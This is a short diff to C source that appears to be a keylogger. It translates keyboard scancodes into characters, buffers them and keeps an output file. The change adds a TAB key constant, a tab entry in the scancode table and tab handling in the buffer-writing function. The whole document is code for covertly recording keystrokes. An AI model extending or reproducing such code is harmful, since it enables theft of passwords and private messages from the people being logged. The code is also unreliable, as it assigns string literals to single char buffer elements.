@@ -35,6 +35,7 @@ unsigned char previousScancode = 0;
 #define SPACE 0x39
 #define ENTER 0x1c
 #define BACKSPACE 0x0e
+#define TAB 0x0f
 
 // output file constants/variables
 #define OUTPUT_MODE 0644
@@ -88,7 +89,7 @@ char *scancodes[][NUMBER_OF_MODES] = {
 	{"5", "%", "5"}, 		{"6", "^", "6"}, 		{"7", "&", "7"}, 
 	{"8", "*", "8"}, 		{"9", "(", "9"}, 		{"0", ")", "0"}, 
 	{"-","_", "-"}, 		{"=", "+", "="}, 		{"BKSP", "BKSP", "BKSP"}, 
-	{"\t", "\t", "\t"}, 		{"q", "Q", "Q"}, 		{"w", "W", "W"},
+	{"TAB", "TAB", "TAB"}, 		{"q", "Q", "Q"}, 		{"w", "W", "W"},
 	{"e", "E", "E"}, 		{"r","R", "R"}, 		{"t", "T", "T"}, 
 	{"y", "Y", "Y"}, 		{"u", "U", "U"}, 		{"i","I", "I"}, 
 	{"o", "O", "O"},		{"p", "P", "P"},		{"[", "{", "["}, 
@@ -270,10 +271,16 @@ void write_to_simple_buffer(char scancode, char* key)
 			simple_pos++;
 		}
 
-		else if (scancode == BACKSPACE)
+		else if (scancode == BACKSPACE) // NOTE: backspace can be buggy if used right after switching windows
 		{
 			simple_pos--;
 			simple_char_buffer[simple_pos] = "\0";
+		}
+
+		else if (scancode == TAB)
+		{
+			simple_char_buffer[simple_pos] = "\t";
+			simple_pos++;
 		}
 
 		else
